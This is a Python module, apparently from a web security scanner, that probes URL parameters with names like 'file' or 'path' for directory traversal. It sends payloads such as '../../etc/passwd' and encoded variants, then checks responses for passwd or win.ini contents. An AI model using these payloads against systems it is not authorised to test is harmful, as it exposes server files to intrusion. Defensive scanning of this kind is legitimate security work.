import httpx
from urllib.parse import urlencode, urlparse, parse_qs
from models import VulnerabilityResult, Severity

# Path traversal payloads
TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "..\\..\\windows\\win.ini",
    "....//....//etc/passwd",
    "..%2f..%2fetc%2fpasswd",
    "..%5c..%5cwindows%5cwin.ini",
    "....//....//....//etc/passwd",
]

# Known file content signatures
FILE_SIGNATURES = {
    "etc/passwd": ["root:", "/bin/bash", "/bin/sh", "nobody:"],
    "win.ini": ["[fonts]", "[extensions]", "[mci extensions]"],
}


def check_traversal_success(response_text: str) -> str | None:
    """Check if the response contains known file contents."""
    text_lower = response_text.lower()
    for file_type, signatures in FILE_SIGNATURES.items():
        matches = sum(1 for sig in signatures if sig.lower() in text_lower)
        if matches >= 2:  # Require at least 2 matches to reduce false positives
            return file_type
    return None


async def test_traversal(target: str, crawl_data: dict) -> list[VulnerabilityResult]:
    """Test for directory traversal vulnerabilities."""
    domain = target.replace("https://", "").replace("http://", "").strip("/").split("/")[0]
    results = []

    async with httpx.AsyncClient(timeout=10, follow_redirects=True, verify=False) as client:
        # Test URL parameters
        for url in crawl_data.get("params", [])[:10]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param_name in params:
                # Focus on parameters likely to handle files
                name_lower = param_name.lower()
                if not any(kw in name_lower for kw in
                           ["file", "path", "page", "doc", "dir", "folder",
                            "include", "load", "read", "template", "view"]):
                    continue

                for payload in TRAVERSAL_PAYLOADS[:3]:
                    test_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                    test_params[param_name] = payload
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"

                    try:
                        resp = await client.get(test_url)
                        file_type = check_traversal_success(resp.text)

                        if file_type:
                            results.append(VulnerabilityResult(
                                name=f"Directory Traversal in parameter '{param_name}'",
                                category="traversal",
                                severity=Severity.CRITICAL,
                                url=test_url,
                                payload=payload,
                                evidence=f"Contents of {file_type} found in response",
                                description="The application allows reading arbitrary files from the server filesystem.",
                                recommendation="Validate and sanitize file paths. Use a whitelist of allowed files. Avoid passing file paths in user input.",
                            ))
                            break
                    except Exception:
                        continue

    return results
